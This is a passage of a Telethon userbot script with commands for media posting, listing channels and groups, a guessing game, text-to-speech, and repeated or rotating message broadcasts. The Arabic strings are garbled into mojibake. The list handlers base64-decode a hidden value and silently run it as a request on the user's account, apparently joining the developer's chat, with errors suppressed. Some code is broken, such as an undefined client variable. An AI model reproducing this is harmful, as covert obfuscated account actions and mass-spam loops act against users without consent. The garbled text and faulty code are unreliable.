                    return await a.edit(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ŸÇŸÖ ÿ®ÿ™Ÿàÿ¨ŸäŸá ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸâ ŸÖÿ∑Ÿàÿ±Ÿä @X_54P\n{er}")
            
            
                
                await a.edit(f' Ÿäÿ¨ÿ±Ÿä ÿßŸÑÿ™ÿ≠ŸÖŸäŸÑ ŸÑŸÑÿÆÿßÿØŸÖ..!\n'
                   f' Ÿäÿ¨ÿ±Ÿä ÿßŸÑÿ±ŸÅÿπ ŸÑŸÑÿ™ŸÑÿ¨ÿ±ÿßŸÖ‚è≥__')
                start = time.time()
                title = "ŸÅŸäÿØŸäŸà"
                filesize_bytes = os.path.getsize(video_filename)
                filesize = filesize_bytes / (1024 * 1024)
                catid = await reply_id(event.message)
                await l313l.send_file(
                   event.chat_id, f"{directory}/{filename}", reply_to=catid,     force_document=False,     caption=f"**ÿßŸÑŸÖŸÑŸÅ : ** {filename}\n**ÿßŸÑÿ≠ÿ¨ŸÖ :**     {round(filesize, 1)} MB"
                 )
        
                await a.delete()
     
                shutil.rmtree(directory)
    #else:
       # return None
       

@client.on(events.NewMessage(outgoing=True, pattern=".ŸÑŸàŸÉŸä ÿ¥ÿØÿÆŸÑŸÉ$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/382/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="‚éôÔ∏ô BY : ÿ¥ÿØÿÆŸÑŸÉ ‚éô",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ŸäÿπŸÜŸä ŸáŸÑ ÿÆÿ±Ÿá$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/381/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="‚éôÔ∏ô BY : ÿÆÿ±Ÿá ‚éô",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(pattern=".ŸÇÿßÿ¶ŸÖŸá (ÿ¨ŸÖŸäÿπ ÿßŸÑŸÇŸÜŸàÿßÿ™|ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑŸÖÿ¥ÿ±ŸÅ ÿπŸÑŸäŸáÿß|ŸÇŸÜŸàÿßÿ™Ÿä)"))
async def ViewChJok(event):
    catcmd = event.pattern_match.group(1)
    catevent = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    cat = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    hi = []
    hica = []
    hico = []
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            channel_name = entity.title
            channel_id = entity.id
            is_owner = entity.creator
            is_admin = entity.admin_rights
            if entity.username:
                if entity.megagroup:
                    channel_link = f"{channel_name} ({entity.username})"
                else:
                    channel_link = f"[{channel_name}](https://t.me/{entity.username})"
            else:
                if entity.megagroup:
                    channel_link = f"{channel_name}"
                else:
                    channel_link = f"[{channel_name}](https://t.me/c/{channel_id}/1)"
            if is_owner:
                hico.append(channel_link)
            if is_admin:
                hica.append(channel_link)
            if not is_owner and not is_admin:
                hi.append(channel_link)
    if catcmd == "ÿ¨ŸÖŸäÿπ ÿßŸÑŸÇŸÜŸàÿßÿ™":
        output = CHANNELS_STR
        for k, channel in enumerate(hi, start=1):
            output += f"{k}‚Ä¢ {channel}\n"
    elif catcmd == "ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑŸÖÿ¥ÿ±ŸÅ ÿπŸÑŸäŸáÿß":
        output = CHANNELS_ADMINSTR
        for k, channel in enumerate(hica, start=1):
            output += f"{k}‚Ä¢ {channel}\n"
    elif catcmd == "ŸÇŸÜŸàÿßÿ™Ÿä":
        output = CHANNELS_OWNERSTR
        for k, channel in enumerate(hico, start=1):
            output += f"{k}‚Ä¢ {channel}\n"
    stop_time = time.time() - start_time
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    output += f"\n\n**ÿßÿ≥ÿ™ÿ∫ÿ±ŸÇ ÿ≠ÿ≥ÿßÿ® ÿßŸÑŸÇŸÜŸàÿßÿ™: **{stop_time:.02f} ÿ´ÿßŸÜŸäÿ©"
    try:
        await catevent.edit(output)
    except Exception:
        await edit_or_reply(catevent, output)

async def edit_or_reply(event, text, buttons=None):
    if buttons is None:
        buttons = []
    if event.edit_date is None:
        return await event.reply(text, buttons=buttons)
    else:
        return await event.edit(text, buttons=buttons)
        
@client.on(events.NewMessage(pattern=".ŸÇÿßÿ¶ŸÖŸá (ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™|ŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßÿØŸäÿ±Ÿáÿß|ŸÉÿ±Ÿàÿ®ÿßÿ™Ÿä)$"))
async def stats(event):  # sourcery no-metrics
    catcmd = event.pattern_match.group(1)
    catevent = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    cat = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    hi = []
    higa = []
    higo = []
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            continue
        elif (
            isinstance(entity, Channel)
            and entity.megagroup
            or not isinstance(entity, Channel)
            and not isinstance(entity, User)
            and isinstance(entity, Chat)
        ):
            hi.append([entity.title, entity.id])
            if entity.creator or entity.admin_rights:
                higa.append([entity.title, entity.id])
            if entity.creator:
                higo.append([entity.title, entity.id])
    if catcmd == "ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™":
        output = GROUPS_STR
        for k, i in enumerate(hi, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_STR
    elif catcmd == "ŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßÿØŸäÿ±Ÿáÿß":
        output = GROUPS_ADMINSTR
        for k, i in enumerate(higa, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_ADMINSTR
    elif catcmd == "ŸÉÿ±Ÿàÿ®ÿßÿ™Ÿä":
        output = GROUPS_OWNERSTR
        for k, i in enumerate(higo, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_OWNERSTR
    stop_time = time.time() - start_time
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    output += f"\n**ÿßÿ≥ÿ™ÿ∫ÿ±ŸÇ ÿ≠ÿ≥ÿßÿ® ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ : ** {stop_time:.02f} ÿ´ÿßŸÜŸäŸá"
    try:
        await catevent.edit(output)
    except Exception:
        await edit_or_reply(
            catevent,
            output,
            caption=caption,
        )
STAT_INDICATION = "**‚éôÔ∏ô ÿ¨ŸÄÿßÿ±Ÿä ÿ¨ŸÄŸÖŸÄÿπ ÿßŸÑÿ•ÿ≠ÿµŸÄÿßÿ¶ŸäŸÄÿßÿ™ ÿßŸÜÿ™ŸÄÿ∏ŸÄÿ± ‚è± **"
CHANNELS_STR = "**‚éôÔ∏ô ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿ™Ÿä ÿ£ŸÜÿ™ ŸÅŸäŸáÿß ŸÖŸàÿ¨ŸàÿØÿ© ŸáŸÜÿß\n\n"
CHANNELS_ADMINSTR = "**‚éôÔ∏ô ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿ™Ÿä ÿßŸÜÿ™ ŸÖÿ¥ŸÄÿ±ŸÅ ÿ®ŸáŸÄÿß **\n\n"
CHANNELS_OWNERSTR = "**‚éôÔ∏ô ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿ™Ÿä ÿ™ŸÄŸÉŸàŸÜ ÿßŸÜÿ™ ŸÖÿßŸÑŸÉŸÄŸáÿß**\n\n"
GROUPS_STR = "**‚éôÔ∏ô ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßŸÑÿ™Ÿä ÿ£ŸÜÿ™ ŸÅŸäŸáÿß ŸÖŸàÿ¨ŸàÿØ ŸÅŸäŸÄŸáÿß**\n\n"
GROUPS_ADMINSTR = "**‚éôÔ∏ô ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßŸÑÿ™Ÿä ÿ™ŸÉŸàŸÜ ŸÖÿ¥ŸÄÿ±ŸÅ ÿ®ŸáŸÄÿß**\n\n"
GROUPS_OWNERSTR = "**‚éôÔ∏ô ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßŸÑÿ™Ÿä ÿ™ŸÄŸÉŸàŸÜ ÿßŸÜÿ™ ŸÖÿßŸÑŸÉŸÄŸáÿß**\n\n"

@client.on(events.NewMessage(outgoing=True, pattern=r'\.ÿßÿ≥ÿ±ÿπ (.*)'))
async def handle_start(event):
    global is_game_started, is_word_sent, word, bot_entity
    is_game_started = True
    is_word_sent = False
    word = event.pattern_match.group(1)
    chat_id = event.chat_id
    await event.edit(f"**ÿßŸàŸÑ ŸÖŸÜ ŸäŸÉÿ™ÿ® ( {word} ) ÿ≥ŸäŸÅŸàÿ≤**")

joker = [
    "ÿ™ŸÑÿπÿ® ŸàÿÆŸàÿ¥ ÿ™ŸÑÿπÿ® ",
    "ŸÑŸÉ ÿπÿßÿ¥ Ÿäÿßÿ®ÿ∑ŸÑ ÿßÿ≥ÿ™ŸÖÿ± ",
    "ÿπŸÑŸâ ŸÉŸäŸÅŸÉ ÿ±ŸÉÿ≤ÿ≤ÿ≤ÿ≤ ÿßŸÜÿ™Ÿé ŸÉÿØŸáÿß ",
    "ŸÑŸÉ ŸàÿπŸÑŸä ÿ∞ŸäŸäŸäÿ® ",
]

correct_answer = None
game_board = [["" for _ in range(6)] for _ in range(1)]
numbers_board = [["1Ô∏è‚É£", "2Ô∏è‚É£", "3Ô∏è‚É£", "4Ô∏è‚É£", "5Ô∏è‚É£", "6Ô∏è‚É£"]]
original_game_board = [["" for _ in range(6)] for _ in range(1)]
joker_player = None
is_game_started2 = False
group_game_status = {}
points = {}

async def handle_clue(event):
    global group_game_status, correct_answer, game_board
    chat_id = event.chat_id
    if chat_id not in group_game_status or not group_game_status[chat_id]:
        group_game_status[chat_id] = {
            'is_game_started2': False,
            'joker_player': None
        }
    if not group_game_status[chat_id]['is_game_started2']:
        group_game_status[chat_id]['is_game_started2'] = True
        group_game_status[chat_id]['joker_player'] = None
        correct_answer = random.randint(1, 6)
        await event.edit(f"**ÿßŸàŸÑ ŸÖŸÜ Ÿäÿ±ÿ≥ŸÑ ŸÉŸÑŸÖÿ© (ÿßŸÜÿß) ÿ≥Ÿäÿ¥ÿßÿ±ŸÉ ŸÅŸä ŸÑÿπÿ®ÿ© ÿßŸÑŸÖÿ≠Ÿäÿ®ÿ≥\nŸÖŸÑÿßÿ≠ÿ∏ÿ© : ŸÑŸÅÿ™ÿ≠ ÿßŸÑÿπÿ∂ŸÖÿ© ÿßÿ±ÿ≥ŸÑ ÿ∑ŸÉ Ÿàÿ±ŸÇŸÖ ÿßŸÑÿπÿ∂ŸÖÿ© ŸÑÿ£ÿÆÿ∞ ÿßŸÑŸÖÿ≠ÿ®ÿ≥ ÿ£ÿ±ÿ≥ŸÑ ÿ¨Ÿäÿ® Ÿàÿ±ŸÇŸÖ ÿßŸÑÿπÿ∂ŸÖÿ©**")

@client.on(events.NewMessage(pattern=r"^ŸÖÿ≠Ÿäÿ®ÿ≥$"))
async def handler(event):
    global group_game_status
    chat_id = event.chat_id
    if chat_id in group_game_status:
        group_game_status[chat_id]['is_game_started2'] = False
    await handle_clue(event)
    

@client.on(events.NewMessage(pattern=r'\ÿ∑ŸÉ (\d+)'))
async def handle_strike(event):
    global group_game_status, correct_answer, game_board
    chat_id = event.chat_id
    if chat_id in group_game_status and group_game_status[chat_id]['is_game_started2'] and event.sender_id == group_game_status[chat_id]['joker_player']:
        strike_position = int(event.pattern_match.group(1))
        if strike_position == correct_answer:
            game_board = [["üíç" if i == correct_answer - 1 else "üñêÔ∏è" for i in range(6)]]
            await event.reply(f"** ÿÆÿ≥ÿ±ÿ™ ÿ¥ÿ®ŸäŸÉ ŸÖÿ≥ÿ™ÿπÿ¨ŸÑ Ÿàÿ¨Ÿá ÿßŸÑ⁄ÜŸàÿ® üòí\n{format_board(game_board, numbers_board)}**")
            game_board = [row[:] for row in original_game_board]
            group_game_status[chat_id]['is_game_started2'] = False
            group_game_status[chat_id]['joker_player'] = None
        else:
            game_board[0][strike_position - 1] = 'üñêÔ∏è'
            lMl10l = random.choice(joker)
            await event.reply(f"**{lMl10l}**\n{format_board(game_board, numbers_board)}")

@client.on(events.NewMessage(pattern=r'\ÿ¨Ÿäÿ® (\d+)'))
async def handle_guess(event):
    global group_game_status, correct_answer, game_board
    chat_id = event.chat_id
    if chat_id in group_game_status and group_game_status[chat_id]['is_game_started2'] and event.sender_id == group_game_status[chat_id]['joker_player']:
        guess = int(event.pattern_match.group(1))
        if 1 <= guess <= 6:
            if guess == correct_answer:
                winner_id = event.sender_id
                if winner_id not in points:
                    points[winner_id] = 0
                points[winner_id] += 1
                sender = await event.get_sender()
                sender_first_name = sender.first_name if sender else 'ŸÖÿ¨ŸáŸàŸÑ'
                sorted_points = sorted(points.items(), key=lambda x: x[1], reverse=True)
                points_text = '\n'.join([f'{i+1}‚Ä¢ {(await l313l.get_entity(participant_id)).first_name}: {participant_points}' for i, (participant_id, participant_points) in enumerate(sorted_points)])
                game_board = [["üíç" if i == correct_answer - 1 else "üñêÔ∏è" for i in range(6)]]
                await l313l.send_message(event.chat_id, f'ÿßŸÑŸÅ ŸÖÿ®ÿ±ŸàŸàŸàŸÉ üéâ ÿßŸÑÿßÿπÿ® ( {sender_first_name} ) Ÿàÿ¨ÿØ ÿßŸÑŸÖÿ≠ÿ®ÿ≥ üíç!\n{format_board(game_board, numbers_board)}')
                game_board = [row[:] for row in original_game_board]
                await l313l.send_message(event.chat_id, f'ŸÜŸÇÿßÿ∑ ÿßŸÑÿßÿπÿ® : {points[winner_id]}\nŸÜŸÇÿßÿ∑ ÿßŸÑŸÖÿ¥ÿßÿ±ŸÉŸäŸÜ:\n{points_text}')
            else:
                game_board = [["üíç" if i == correct_answer - 1 else "üñêÔ∏è" for i in range(6)]]
                await event.reply(f"**ÿ∂ÿßÿπ ÿßŸÑÿ®ÿßÿ™ ŸÖÿßÿ∂ŸÜ ÿ®ÿπÿØ ÿ™ŸÑ⁄ØŸàŸÜÿ© ‚òπÔ∏è\n{format_board(game_board, numbers_board)}**")
                game_board = [row[:] for row in original_game_board]
            group_game_status[chat_id]['is_game_started2'] = False
            group_game_status[chat_id]['joker_player'] = None

@client.on(events.NewMessage(pattern=r'\ÿßŸÜÿß'))
async def handle_incoming_message(event):
    global group_game_status
    chat_id = event.chat_id
    if chat_id not in group_game_status:
        group_game_status[chat_id] = {
            'is_game_started2': False,
            'joker_player': None
        }
    if group_game_status[chat_id]['is_game_started2'] and not group_game_status[chat_id]['joker_player']:
        group_game_status[chat_id]['joker_player'] = event.sender_id
        await event.reply(f"**ÿ™ŸÖ ÿ™ÿ≥ÿ¨ŸäŸÑŸÉ ŸÅŸä ÿßŸÑŸÖÿ≥ÿßÿ®ŸÇÿ© ÿ±Ÿàÿ≠ ÿ≥Ÿàÿ±ÿ≥ ÿßŸäŸÅÿß ÿ®ÿ∏Ÿáÿ±ŸÉ\n{format_board(game_board, numbers_board)}**")

def format_board(game_board, numbers_board):
    formatted_board = ""
    formatted_board += " ".join(numbers_board[0]) + "\n"
    formatted_board += " ".join(game_board[0]) + "\n"
    return formatted_board

@client.on(events.NewMessage(pattern=r'ŸÖŸÜÿπ_ÿßŸÑÿ™ŸÅŸÑŸäÿ¥'))
async def handle_incoming_message(event):
    addgvar("Mn3_Kick", True)
    await event.edit("**‚éôÔ∏ô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ŸÖŸÜÿπ ÿßŸÑÿ™ŸÅŸÑŸäÿ¥ ŸÑŸÑŸÖÿ¨ŸÖŸàÿπÿ© ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")

@client.on(events.NewMessage(pattern=r'ÿ≥ŸÖÿßÿ≠_ÿßŸÑÿ™ŸÅŸÑŸäÿ¥'))
async def handle_incoming_message(event):
    delgvar("Mn3_Kick")
    await event.edit("**‚éôÔ∏ô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ŸÖŸÜÿπ ÿßŸÑÿ™ŸÅŸÑŸäÿ¥ ŸÑŸÑŸÖÿ¨ŸÖŸàÿπÿ© ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")
message_counts = {}
enabled_groups = []
Ya_Abbas = False
@client.on(events.NewMessage(pattern=r'ÿßŸÑŸÜÿ¥ÿ± ÿ™ÿπÿ∑ŸäŸÑ'))
async def handle_incoming_message(event):
    global Ya_Abbas
    Ya_Abbas = True
    enabled_groups.append(event.chat_id)
    await event.edit("**‚éôÔ∏ô ‚úì ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿßŸÖÿ± ŸÖŸÜÿπ ÿßŸÑŸÜÿ¥ÿ± ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä ÿ®ŸÜÿ¨ÿßÿ≠**")
@client.on(events.NewMessage(pattern=r'ÿßŸÑŸÜÿ¥ÿ± ÿ™ŸÅÿπŸäŸÑ'))
async def handle_incoming_message(event):
    global Ya_Abbas
    Ya_Abbas = False
    enabled_groups.remove(event.chat_id)
    await event.edit("**‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÖÿ± ŸÖŸÜÿπ ÿßŸÑŸÜÿ¥ÿ± ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì **")

@client.on(events.NewMessage(outgoing=True, pattern=".ÿ≤Ÿäÿ¨ ÿ≠ÿ≤ŸäŸÜ"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/125/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="‚éôÔ∏ô BY : ÿ≤Ÿäÿ¨ ÿ≠ÿ≤ŸäŸÜ ‚éô",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ÿßŸàŸäŸÑŸä$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/361/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="‚éôÔ∏ô BY : ÿßŸàŸäŸÑŸä ‚éô",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".Ÿáÿßÿ±ŸàŸÜŸä$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/380/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="‚éôÔ∏ô BY : Ÿáÿßÿ±ŸàŸÜŸä ‚éô",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ÿßŸÜÿß$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/Xgoopb/4/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="‚éôÔ∏ô BY : ÿßŸÜÿß ÿßŸÑÿ∞Ÿä ÿßÿ±ÿπÿ® ÿßŸÖÿ±ŸäŸÉÿß ‚éô",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ÿ®ÿ±ÿπ$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/Xgoopb/5/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="‚éôÔ∏ô BY : ÿ™ŸÅ ŸäŸÑŸá ÿ®ÿ±ÿπ ÿ®ÿ±ÿπ ‚éô",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(from_users='me', pattern='.ŸÅÿ≠ÿµ'))
async def send_welcome_message(event):
    await event.delete()
    current_time = dt.datetime.now(dt.timezone(dt.timedelta(hours=3)))
    uptime = current_time.strftime('%H:%M')
    python_version = platform.python_version()
    telethon_ver = telethon_version.__version__
    setup_date = dt.datetime.now(dt.timezone(dt.timedelta(hours=3)))
    setup_date_str = setup_date.strftime('%Y-%m-%d %H:%M')
    Tare5 = installation_time  # Ÿäÿ¨ÿ® ÿ™ÿπÿ±ŸäŸÅ ÿßŸÑŸÖÿ™ÿ∫Ÿäÿ± installation_time
    mention = ""  # Ÿäÿ¨ÿ® ÿ™ÿπÿ±ŸäŸÅ ÿßŸÑŸÖÿ™ÿ∫Ÿäÿ± mention
    try:
        ping_time = ping("8.8.8.8", unit="ms")
        if ping_time is not None:
            ping_result = f"{ping_time:.2f} ms"
        else:
            ping_result = "ÿ™ÿπÿ∞ÿ± ÿßŸÑÿ≠ÿ≥ÿßÿ®"
    except Exception:
        ping_result = "ÿ™ÿπÿ∞ÿ± ÿßŸÑÿ≠ÿ≥ÿßÿ®"
    if event.sender is not None:
        owner_mention = event.sender.username if event.sender.username else ""
    else:
        owner_mention = ""
    mention = owner_mention
    start_time = time.time()  # Ÿäÿ¨ÿ® ÿ™ÿπÿ±ŸäŸÅ ÿßŸÑŸÖÿ™ÿ∫Ÿäÿ± start_time
    end_time = time.time()
    ms = round((end_time - start_time) * 1000, 2)  # Ÿäÿ¨ÿ® ÿ™ÿπÿ±ŸäŸÅ ÿßŸÑŸÖÿ™ÿ∫Ÿäÿ± ms ÿ®ÿ¥ŸÉŸÑ ÿµÿ≠Ÿäÿ≠
    welcome_message = f""" 
‚ï≠‚îÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅñ§ê‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÄ‚ïÆ 
‚ú¶ ùôΩùô∞ùôºùô¥ : `{mention}` Ÿ´ 
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ 
‚ú¶ ùôøùöàùöÉùô∑ùôæùôΩ : `{python_version}` Ÿ´ 
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ 
‚ú¶ ùêÑùêïùêÑ : `{telethon_ver}` Ÿ´ 
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ 
‚ú¶ ùöÑùôøùöÉùô∏ùôºùô¥ : `{uptime}` Ÿ´ 
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ 
‚ú¶ ùôøùô∏ùôΩùô∂ : `{ms}` Ÿ´ 
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ 
‚ú¶ ùöÇùô¥ùöÉùöÑùôø ùô≥ùô∞ùöÉùô¥ : `{setup_date_str}` Ÿ´ 
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ 
‚ú¶ ùêàùêÉ : `{event.sender_id}` Ÿ´ 
‚ï∞‚îÄ‚îÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅñ§ê‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÄ‚îÄ‚ïØ 
‚ú¶ [ ùóòùó©ùóî ùó¶ùó¢ùó®ùó•ùóñùóò ](t.me/S21S6) 
‚ú¶ """
    await event.respond(welcome_message)

@client.on(events.NewMessage(outgoing=True, pattern=r"^\.ÿ≥Ÿàÿ®ÿ± (\d+)$"))
async def final_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    await event.delete()
    seconds = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    message =  await event.get_reply_message()
    try:
        sleeptimet = int(seconds[0])
    except Exception:
        return await event.reply("**‚ñ™Ô∏é|Ÿäÿ¨ÿ® ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ŸÉÿ™ÿßÿ®ÿ© ÿµÿ≠Ÿäÿ≠ÿ© ÿßŸÑÿ±ÿ¨ÿßÿ° ÿßŸÑÿ™ÿßŸÉÿØ ŸÖŸÜ ÿßŸÑÿßŸÖÿ± ÿßŸàŸÑÿß.**", parse_mode="md")
    finalll = event.client
    global final
    final = True
    await final_supernshr(finalll, sleeptimet, message)

@client.on(events.NewMessage(outgoing=True, pattern=r"^\.ÿ®ŸÑÿ¥ (\d+)$"))
async def repeat_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    await event.delete()
    seconds = int(event.pattern_match.group(1))
    message = await event.get_reply_message()
    if not message:
        return await event.reply("**‚ñ™Ô∏é|Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ Ÿáÿ∞ÿß ÿßŸÑÿßŸÖÿ±.**", parse_mode="md")

    global final
    final = True

    while final:
        await message.respond(message)
        await asyncio.sleep(seconds)
        

@client.on(events.NewMessage(outgoing=True, pattern=r"^\.ÿ™ŸÜÿßŸàÿ® (\d+)$"))
async def rotate_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    await event.delete()
    seconds = int(event.pattern_match.group(1))
    message = await event.get_reply_message()
    if not message:
        return await event.reply("**‚ñ™Ô∏é|Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ Ÿáÿ∞ÿß ÿßŸÑÿßŸÖÿ±.**", parse_mode="md")

    global final
    final = True
    chats = await finalll.get_dialogs()
    groups = [chat for chat in chats if chat.is_group]
    num_groups = len(groups)
    current_group_index = 0

    while final:
        try:
            if message.media:
                await finalll.send_file(groups[current_group_index].id, message.media, caption=message.text)
            else:
                await finalll.send_message(groups[current_group_index].id, message.text)
        except Exception as e:
            print(f"Error in sending message to chat {groups[current_group_index].id}: {e}")

@events.register(events.NewMessage(pattern="\.gym$", outgoing=True))
async def gym(event):
    if event.fwd_from:
        return
    deq = deque(list("üèÉ‚Äçüèã‚Äçü§∏‚ÄçüèÉ‚Äçüèã‚Äçü§∏‚ÄçüèÉ‚Äçüèã‚Äçü§∏‚Äç"))
    for _ in range(48):
        await asyncio.sleep(0.1)
        await event.edit("".join(deq))
        deq.rotate(1)

pattern = r"^test(?:\s|$)([\s\S]*)"
@client.on(events.NewMessage(pattern=pattern))
async def handler(event):
    tr = translate("ÿßŸÜÿß ÿπÿ±ÿßŸÇŸä", lang_tgt="fa").replace("\ N", "\n")
    await edit_or_reply(event, tr)
    result = await l313l(functions.users.GetFullUserRequest(
        id='earthlink_telecommunications'
    ))
    await event.reply(result.stringify())



pattern = r"^ÿ™ŸÉŸÑŸÖ(?:\s|$)([\s\S]*)"
@client.on(events.NewMessage(pattern=pattern))

async def handler(event):

    if event.fwd_from:
        return
    input_str = event.pattern_match.group(1)
    start = datetime.now()
    if event.reply_to_msg_id:
        previous_message = await event.get_reply_message()
        text = previous_message.message
        lan = input_str

    elif "|" in input_str:
        lan, text = input_str.split("|")

    else:

        await edit_or_reply(event, "- Ÿáÿ∞ÿß ŸÜÿµ ÿ∫Ÿäÿ± ÿµÿ≠Ÿäÿ≠")
        return
        text = text.strip()
        lan = lan.strip()

    HuReevent = await edit_or_reply(event, "‚åî‚àÆ ÿ¨ŸÄÿßÿ± ÿßŸÑÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÜÿ™ŸÄÿ∏ÿ± ŸÇŸÑŸäŸÑÿß")


    if not os.path.isdir("./temp/"):

        os.makedirs("./temp/")

    required_file_name = "./temp/" + "voice.ogg"

    try:

        tts = gTTS(text, lang=lan)
        tts.save(required_file_name)
        command_to_execute = [
            "ffmpeg",
            "-i",
             required_file_name,
             "-map",
             "0:a",
             "-codec:a",
             "libopus",
             "-b:a",
             "100k",
             "-vbr",
             "on",
             required_file_name + ".opus"
        ]
        
        try:

            t_response = subprocess.check_output(

                command_to_execute, stderr=subprocess.STDOUT

            )

        except (subprocess.CalledProcessError, NameError, FileNotFoundError) as exc:

            await HuReevent.edit(str(exc))

        else:

            os.remove(required_file_name)

            required_file_name = required_file_name + ".opus"

        end = datetime.now()

        ms = (end - start).seconds

        await event.client.send_file(

            event.chat_id,

            required_file_name,

            reply_to=event.message.reply_to_msg_id,

            allow_cache=False,

            voice_note=True,

        )

        os.remove(required_file_name)

        await edit_delete(

            HuReevent,

            "ÿ™ÿ≠ŸàŸäŸÑ ÿßŸÑŸÜÿµ {} ÿßŸÑŸâ ŸÖŸÇÿ∑ÿπ ÿµŸàÿ™Ÿä ŸÅŸä {} ÿ´ŸàÿßŸÜŸä ".format(text[0:20], ms),

        )

    except Exception as e:

